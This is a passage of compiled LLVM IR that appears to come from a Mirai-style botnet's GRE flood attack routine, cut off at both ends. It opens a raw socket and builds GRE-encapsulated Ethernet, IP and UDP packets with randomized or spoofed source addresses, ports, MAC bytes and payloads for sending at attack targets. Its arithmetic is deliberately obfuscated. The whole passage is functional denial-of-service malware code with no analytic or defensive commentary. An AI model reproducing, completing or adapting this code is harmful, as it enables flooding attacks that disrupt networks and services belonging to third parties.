  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, %87
  %91 = sub i64 0, %89
  %92 = add i64 %90, %91
  %93 = sub i64 0, %92
  %94 = add nsw i64 %87, %89
  %95 = trunc i64 %93 to i32
  store i32 %95, i32* %24, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %12, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %5
  br label %606

; <label>:99:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %100 = load i32, i32* %12, align 4
  %101 = bitcast i32* %11 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %12, align 4
  %106 = call i32 @close(i32 %105)
  br label %606

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %11, align 4
  br label %108

; <label>:108:                                    ; preds = %334, %107
  %109 = load i32, i32* %11, align 4
  %110 = load i8, i8* %7, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %341

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.grehdr*
  store %struct.grehdr* %127, %struct.grehdr** %26, align 8
  %128 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %129 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %128, i64 1
  %130 = bitcast %struct.grehdr* %129 to %struct.ethhdr*
  store %struct.ethhdr* %130, %struct.ethhdr** %27, align 8
  %131 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %132 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %131, i64 1
  %133 = bitcast %struct.ethhdr* %132 to %struct.iphdr*
  store %struct.iphdr* %133, %struct.iphdr** %28, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i64 1
  %136 = bitcast %struct.iphdr* %135 to %struct.udphdr*
  store %struct.udphdr* %136, %struct.udphdr** %29, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 15, -1
  %141 = xor i8 %139, %140
  %142 = and i8 %141, %139
  %143 = and i8 %139, 15
  %144 = xor i8 %142, -1
  %145 = xor i8 64, -1
  %146 = xor i8 30, -1
  %147 = and i8 %144, 30
  %148 = and i8 %142, %146
  %149 = and i8 %145, 30
  %150 = and i8 64, %146
  %151 = or i8 %147, %148
  %152 = or i8 %149, %150
  %153 = xor i8 %151, %152
  %154 = or i8 %144, %145
  %155 = xor i8 %154, -1
  %156 = or i8 30, %146
  %157 = and i8 %155, %156
  %158 = or i8 %153, %157
  %159 = or i8 %142, 64
  store i8 %158, i8* %138, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = xor i8 -16, -1
  %164 = xor i8 %162, %163
  %165 = and i8 %164, %162
  %166 = and i8 %162, -16
  %167 = and i8 %165, 5
  %168 = xor i8 %165, 5
  %169 = or i8 %167, %168
  %170 = or i8 %165, 5
  store i8 %169, i8* %161, align 4
  %171 = load i8, i8* %14, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 1
  store i8 %171, i8* %173, align 1
  %174 = load i32, i32* %20, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 66, -1985129191796142145
  %177 = add i64 %176, %175
  %178 = sub i64 %177, -1985129191796142145
  %179 = add i64 66, %175
  %180 = trunc i64 %178 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %15, align 2
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 3
  store i16 %185, i16* %187, align 4
  %188 = load i8, i8* %16, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 5
  store i8 %188, i8* %190, align 4
  %191 = load i8, i8* %17, align 1
  %192 = icmp ne i8 %191, 0
  br i1 %192, label %193, label %197

; <label>:193:                                    ; preds = %113
  %194 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 4
  store i16 %194, i16* %196, align 2
  br label %197

; <label>:197:                                    ; preds = %193, %113
  %198 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 6
  store i8 47, i8* %199, align 1
  %200 = load i32, i32* %23, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 8
  store i32 %200, i32* %202, align 4
  %203 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %204 = load i32, i32* %11, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i32 0, i32 1
  %208 = load i32, i32* %207, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 9
  store i32 %208, i32* %210, align 4
  %211 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %212 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %213 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %215 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %216 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %215, i32 0, i32 2
  store i16 %214, i16* %216, align 1
  %217 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %218 = bitcast %struct.iphdr* %217 to i8*
  %219 = load i8, i8* %218, align 4
  %220 = xor i8 %219, -1
  %221 = xor i8 15, -1
  %222 = xor i8 103, -1
  %223 = or i8 %220, %221
  %224 = or i8 103, %222
  %225 = xor i8 %223, -1
  %226 = and i8 %225, %224
  %227 = and i8 %219, 15
  %228 = and i8 %226, 64
  %229 = xor i8 %226, 64
  %230 = or i8 %228, %229
  %231 = or i8 %226, 64
  store i8 %230, i8* %218, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %233 = bitcast %struct.iphdr* %232 to i8*
  %234 = load i8, i8* %233, align 4
  %235 = xor i8 %234, -1
  %236 = xor i8 -16, -1
  %237 = xor i8 4, -1
  %238 = or i8 %235, %236
  %239 = or i8 4, %237
  %240 = xor i8 %238, -1
  %241 = and i8 %240, %239
  %242 = and i8 %234, -16
  %243 = and i8 %241, 5
  %244 = xor i8 %241, 5
  %245 = or i8 %243, %244
  %246 = or i8 %241, 5
  store i8 %245, i8* %233, align 4
  %247 = load i8, i8* %14, align 1
  %248 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 1
  store i8 %247, i8* %249, align 1
  %250 = load i32, i32* %20, align 4
  %251 = sext i32 %250 to i64
  %252 = sub i64 0, %251
  %253 = sub i64 28, %252
  %254 = add i64 28, %251
  %255 = trunc i64 %253 to i16
  %256 = call zeroext i16 @htons(i16 zeroext %255) #7
  %257 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 2
  store i16 %256, i16* %258, align 2
  %259 = load i16, i16* %15, align 2
  %260 = zext i16 %259 to i32
  %261 = xor i32 %260, -1
  %262 = and i32 2014568956, %261
  %263 = xor i32 2014568956, -1
  %264 = and i32 %260, %263
  %265 = xor i32 -1, -1
  %266 = and i32 %265, 2014568956
  %267 = and i32 -1, %263
  %268 = or i32 %262, %264
  %269 = or i32 %266, %267
  %270 = xor i32 %268, %269
  %271 = xor i32 %260, -1
  %272 = trunc i32 %270 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #7
  %274 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 3
  store i16 %273, i16* %275, align 4
  %276 = load i8, i8* %16, align 1
  %277 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 5
  store i8 %276, i8* %278, align 4
  %279 = load i8, i8* %17, align 1
  %280 = icmp ne i8 %279, 0
  br i1 %280, label %281, label %285

; <label>:281:                                    ; preds = %197
  %282 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %283 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 4
  store i16 %282, i16* %284, align 2
  br label %285

; <label>:285:                                    ; preds = %281, %197
  %286 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 6
  store i8 17, i8* %287, align 1
  %288 = call i32 @rand_next()
  %289 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = load i8, i8* %22, align 1
  %292 = icmp ne i8 %291, 0
  br i1 %292, label %293, label %299

; <label>:293:                                    ; preds = %285
  %294 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 9
  %296 = load i32, i32* %295, align 4
  %297 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 9
  store i32 %296, i32* %298, align 4
  br label %315

; <label>:299:                                    ; preds = %285
  %300 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 8
  %302 = load i32, i32* %301, align 4
  %303 = sub i32 %302, -533088842
  %304 = sub i32 %303, 1024
  %305 = add i32 %304, -533088842
  %306 = sub i32 %302, 1024
  %307 = xor i32 %305, -1
  %308 = and i32 -1, %307
  %309 = xor i32 -1, -1
  %310 = and i32 %305, %309
  %311 = or i32 %308, %310
  %312 = xor i32 %305, -1
  %313 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 9
  store i32 %311, i32* %314, align 4
  br label %315

; <label>:315:                                    ; preds = %299, %293
  %316 = load i16, i16* %18, align 2
  %317 = call zeroext i16 @htons(i16 zeroext %316) #7
  %318 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 0
  store i16 %317, i16* %319, align 2
  %320 = load i16, i16* %19, align 2
  %321 = call zeroext i16 @htons(i16 zeroext %320) #7
  %322 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 1
  store i16 %321, i16* %323, align 2
  %324 = load i32, i32* %20, align 4
  %325 = sext i32 %324 to i64
  %326 = add i64 8, -6492021052068396633
  %327 = add i64 %326, %325
  %328 = sub i64 %327, -6492021052068396633
  %329 = add i64 8, %325
  %330 = trunc i64 %328 to i16
  %331 = call zeroext i16 @htons(i16 zeroext %330) #7
  %332 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 2
  store i16 %331, i16* %333, align 2
  br label %334

; <label>:334:                                    ; preds = %315
  %335 = load i32, i32* %11, align 4
  %336 = sub i32 0, %335
  %337 = sub i32 0, 1
  %338 = add i32 %336, %337
  %339 = sub i32 0, %338
  %340 = add nsw i32 %335, 1
  store i32 %339, i32* %11, align 4
  br label %108

; <label>:341:                                    ; preds = %108
  br label %342

; <label>:342:                                    ; preds = %605, %341
  store i32 0, i32* %11, align 4
  br label %343

; <label>:343:                                    ; preds = %592, %342
  %344 = load i32, i32* %11, align 4
  %345 = load i8, i8* %7, align 1
  %346 = zext i8 %345 to i32
  %347 = icmp slt i32 %344, %346
  br i1 %347, label %348, label %599

; <label>:348:                                    ; preds = %343
  %349 = load i8**, i8*** %13, align 8
  %350 = load i32, i32* %11, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds i8*, i8** %349, i64 %351
  %353 = load i8*, i8** %352, align 8
  store i8* %353, i8** %33, align 8
  %354 = load i8*, i8** %33, align 8
  %355 = bitcast i8* %354 to %struct.iphdr*
  store %struct.iphdr* %355, %struct.iphdr** %34, align 8
  %356 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i64 1
  %358 = bitcast %struct.iphdr* %357 to %struct.grehdr*
  store %struct.grehdr* %358, %struct.grehdr** %35, align 8
  %359 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %360 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %359, i64 1
  %361 = bitcast %struct.grehdr* %360 to %struct.ethhdr*
  store %struct.ethhdr* %361, %struct.ethhdr** %36, align 8
  %362 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %363 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %362, i64 1
  %364 = bitcast %struct.ethhdr* %363 to %struct.iphdr*
  store %struct.iphdr* %364, %struct.iphdr** %37, align 8
  %365 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i64 1
  %367 = bitcast %struct.iphdr* %366 to %struct.udphdr*
  store %struct.udphdr* %367, %struct.udphdr** %38, align 8
  %368 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %369 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %368, i64 1
  %370 = bitcast %struct.udphdr* %369 to i8*
  store i8* %370, i8** %39, align 8
  %371 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %372 = load i32, i32* %11, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 2
  %376 = load i8, i8* %375, align 4
  %377 = zext i8 %376 to i32
  %378 = icmp slt i32 %377, 32
  br i1 %378, label %379, label %403

; <label>:379:                                    ; preds = %348
  %380 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %381 = load i32, i32* %11, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i32 0, i32 1
  %385 = load i32, i32* %384, align 4
  %386 = call i32 @ntohl(i32 %385) #7
  %387 = call i32 @rand_next()
  %388 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %389 = load i32, i32* %11, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 2
  %393 = load i8, i8* %392, align 4
  %394 = zext i8 %393 to i32
  %395 = lshr i32 %387, %394
  %396 = add i32 %386, 2133859739
  %397 = add i32 %396, %395
  %398 = sub i32 %397, 2133859739
  %399 = add i32 %386, %395
  %400 = call i32 @htonl(i32 %398) #7
  %401 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 9
  store i32 %400, i32* %402, align 4
  br label %403

; <label>:403:                                    ; preds = %379, %348
  %404 = load i32, i32* %23, align 4
  %405 = icmp eq i32 %404, -1
  br i1 %405, label %406, label %410

; <label>:406:                                    ; preds = %403
  %407 = call i32 @rand_next()
  %408 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 8
  store i32 %407, i32* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %406, %403
  %411 = load i16, i16* %15, align 2
  %412 = zext i16 %411 to i32
  %413 = icmp eq i32 %412, 65535
  br i1 %413, label %414, label %448

; <label>:414:                                    ; preds = %410
  %415 = call i32 @rand_next()
  %416 = xor i32 %415, -1
  %417 = xor i32 65535, -1
  %418 = xor i32 578306939, -1
  %419 = or i32 %416, %417
  %420 = or i32 578306939, %418
  %421 = xor i32 %419, -1
  %422 = and i32 %421, %420
  %423 = and i32 %415, 65535
  %424 = trunc i32 %422 to i16
  %425 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 3
  store i16 %424, i16* %426, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 3
  %429 = load i16, i16* %428, align 4
  %430 = zext i16 %429 to i32
  %431 = sub i32 0, 1000
  %432 = add i32 %430, %431
  %433 = sub nsw i32 %430, 1000
  %434 = xor i32 %432, -1
  %435 = and i32 -1504016222, %434
  %436 = xor i32 -1504016222, -1
  %437 = and i32 %432, %436
  %438 = xor i32 -1, -1
  %439 = and i32 %438, -1504016222
  %440 = and i32 -1, %436
  %441 = or i32 %435, %437
  %442 = or i32 %439, %440
  %443 = xor i32 %441, %442
  %444 = xor i32 %432, -1
  %445 = trunc i32 %443 to i16
  %446 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 3
  store i16 %445, i16* %447, align 4
  br label %448

; <label>:448:                                    ; preds = %414, %410
  %449 = load i16, i16* %18, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %461

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = xor i32 65535, -1
  %455 = xor i32 %453, %454
  %456 = and i32 %455, %453
  %457 = and i32 %453, 65535
  %458 = trunc i32 %456 to i16
  %459 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %460 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %459, i32 0, i32 0
  store i16 %458, i16* %460, align 2
  br label %461

; <label>:461:                                    ; preds = %452, %448
  %462 = load i16, i16* %19, align 2
  %463 = zext i16 %462 to i32
  %464 = icmp eq i32 %463, 65535
  br i1 %464, label %465, label %474

; <label>:465:                                    ; preds = %461
  %466 = call i32 @rand_next()
  %467 = xor i32 65535, -1
  %468 = xor i32 %466, %467
  %469 = and i32 %468, %466
  %470 = and i32 %466, 65535
  %471 = trunc i32 %469 to i16
  %472 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %473 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %472, i32 0, i32 1
  store i16 %471, i16* %473, align 2
  br label %474

; <label>:474:                                    ; preds = %465, %461
  %475 = load i8, i8* %22, align 1
  %476 = icmp ne i8 %475, 0
  br i1 %476, label %481, label %477

; <label>:477:                                    ; preds = %474
  %478 = call i32 @rand_next()
  %479 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 9
  store i32 %478, i32* %480, align 4
  br label %487

; <label>:481:                                    ; preds = %474
  %482 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 9
  %484 = load i32, i32* %483, align 4
  %485 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %486 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %485, i32 0, i32 9
  store i32 %484, i32* %486, align 4
  br label %487

; <label>:487:                                    ; preds = %481, %477
  %488 = call i32 @rand_next()
  store i32 %488, i32* %40, align 4
  %489 = call i32 @rand_next()
  store i32 %489, i32* %41, align 4
  %490 = call i32 @rand_next()
  store i32 %490, i32* %42, align 4
  %491 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %492 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %491, i32 0, i32 0
  %493 = getelementptr inbounds [6 x i8], [6 x i8]* %492, i32 0, i32 0
  %494 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %493, i8* %494, i32 4)
  %495 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %496 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %495, i32 0, i32 1
  %497 = getelementptr inbounds [6 x i8], [6 x i8]* %496, i32 0, i32 0
  %498 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %497, i8* %498, i32 4)
  %499 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %500 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %499, i32 0, i32 0
  %501 = getelementptr inbounds [6 x i8], [6 x i8]* %500, i32 0, i32 0
  %502 = getelementptr inbounds i8, i8* %501, i64 4
  %503 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %502, i8* %503, i32 2)
  %504 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %505 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %504, i32 0, i32 1
  %506 = getelementptr inbounds [6 x i8], [6 x i8]* %505, i32 0, i32 0
  %507 = getelementptr inbounds i8, i8* %506, i64 4
  %508 = bitcast i32* %42 to i8*
  %509 = getelementptr inbounds i8, i8* %508, i64 2
  call void @util_memcpy(i8* %507, i8* %509, i32 2)
  %510 = load i8, i8* %21, align 1
  %511 = icmp ne i8 %510, 0
  br i1 %511, label %512, label %519

; <label>:512:                                    ; preds = %487
  %513 = load i8*, i8** %39, align 8
  %514 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %513, i32 %514)
  %515 = load i8*, i8** %39, align 8
  %516 = load i32, i32* %20, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds i8, i8* %515, i64 %517
  store i8 0, i8* %518, align 1
  br label %519

; <label>:519:                                    ; preds = %512, %487
  %520 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %521 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %520, i32 0, i32 7
  store i16 0, i16* %521, align 2
  %522 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %523 = bitcast %struct.iphdr* %522 to i16*
  %524 = call zeroext i16 @checksum_generic(i16* %523, i32 20)
  %525 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %526 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %525, i32 0, i32 7
  store i16 %524, i16* %526, align 2
  %527 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 7
  store i16 0, i16* %528, align 2
  %529 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %530 = bitcast %struct.iphdr* %529 to i16*
  %531 = call zeroext i16 @checksum_generic(i16* %530, i32 20)
  %532 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 %531, i16* %533, align 2
  %534 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %535 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %534, i32 0, i32 3
  store i16 0, i16* %535, align 2
  %536 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %537 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %538 = bitcast %struct.udphdr* %537 to i8*
  %539 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %540 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %539, i32 0, i32 2
  %541 = load i16, i16* %540, align 2
  %542 = load i32, i32* %20, align 4
  %543 = sext i32 %542 to i64
  %544 = sub i64 8, 4660670082269477611
  %545 = add i64 %544, %543
  %546 = add i64 %545, 4660670082269477611
  %547 = add i64 8, %543
  %548 = trunc i64 %546 to i32
  %549 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %536, i8* %538, i16 zeroext %541, i32 %548)
  %550 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %551 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %550, i32 0, i32 3
  store i16 %549, i16* %551, align 2
  %552 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %553 = load i32, i32* %11, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i32 0, i32 0
  %557 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %556, i32 0, i32 0
  store i16 2, i16* %557, align 4
  %558 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %559 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %558, i32 0, i32 9
  %560 = load i32, i32* %559, align 4
  %561 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %562 = load i32, i32* %11, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %561, i64 %563
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %564, i32 0, i32 0
  %566 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %565, i32 0, i32 2
  %567 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %566, i32 0, i32 0
  store i32 %560, i32* %567, align 4
  %568 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %569 = load i32, i32* %11, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %572, i32 0, i32 1
  store i16 0, i16* %573, align 2
  %574 = load i32, i32* %12, align 4
  %575 = load i8*, i8** %33, align 8
  %576 = load i32, i32* %20, align 4
  %577 = sext i32 %576 to i64
  %578 = sub i64 66, -4136356637899774428
  %579 = add i64 %578, %577
